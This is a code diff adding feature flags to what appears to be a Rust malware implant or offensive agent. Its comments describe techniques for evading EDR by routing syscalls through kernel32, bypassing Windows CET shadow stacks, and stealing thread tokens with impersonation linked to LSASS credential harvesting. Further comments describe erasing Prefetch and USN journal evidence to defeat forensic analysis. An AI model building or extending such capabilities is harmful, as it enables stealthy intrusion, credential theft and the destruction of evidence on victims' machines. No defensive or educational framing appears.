@@ -233,6 +233,45 @@ transacted-hollowing = ["direct-syscalls"]
 # Requires (and implies) `direct-syscalls`.  Windows-only.
 delayed-stomp = ["direct-syscalls"]
 
+# User-mode NT kernel interface emulation: routes configured Nt* syscalls
+# through kernel32/advapi32 equivalents instead of ntdll syscall stubs.
+# Makes the agent invisible to EDR hooks on ntdll AND to ntdll unhooking
+# detection.  Call stacks show kernel32!WriteProcessMemory etc. — looks
+# like legitimate API usage.  Falls back to existing indirect syscall path
+# when kernel32 equivalent fails.  Requires (and implies) `direct-syscalls`.
+# Windows-only.
+syscall-emulation = ["direct-syscalls"]
+
+# CET (Control-flow Enforcement Technology) / Shadow Stack bypass: handles
+# Windows 11 24H2+ hardware-enforced shadow stacks that defeat return-address
+# spoofing and stack pivoting.  Three strategies: (1) disable CET via process
+# mitigation policy, (2) CET-compatible call chain building, (3) VEH-based
+# shadow stack fix (experimental, requires kernel access).  Integrates with
+# the existing stack-spoofing code in syscalls.rs by adding a CET-awareness
+# check at the entry point.  Requires (and implies) `direct-syscalls`.
+# Windows-only.
+cet-bypass = ["direct-syscalls"]
+
+# Token-only impersonation via NtImpersonateThread / SetThreadToken:
+# bypasses ImpersonateNamedPipeClient detection by extracting the
+# impersonation token through a helper thread and applying it to the
+# main thread via NtSetInformationThread(ThreadImpersonationToken).
+# Alternative strategy uses DuplicateTokenEx + SetThreadToken directly.
+# Includes encrypted token cache, auto-revert on task completion, and
+# integration with lsass_harvest and P2P SMB pipe connections.
+# Requires (and implies) `direct-syscalls`.  Windows-only.
+token-impersonation = ["direct-syscalls"]
+
+# Forensic cleanup — Windows Prefetch evidence removal: cleans .pf files
+# after injection or on-demand to prevent forensic timeline analysis.
+# Three methods: (1) delete via NtDeleteFile, (2) patch header in-place
+# via NtCreateSection + NtMapViewOfSection (preferred — file remains but
+# contains no useful forensic data), (3) disable Prefetch service via
+# registry.  Also cleans USN journal entries referencing the .pf file.
+# Hooks into injection_engine post-injection for automatic cleanup.
+# Requires (and implies) `direct-syscalls`.  Windows-only.
+forensic-cleanup = ["direct-syscalls"]
+
 [[bin]]
 name = "agent-standalone"
 path = "src/main.rs"
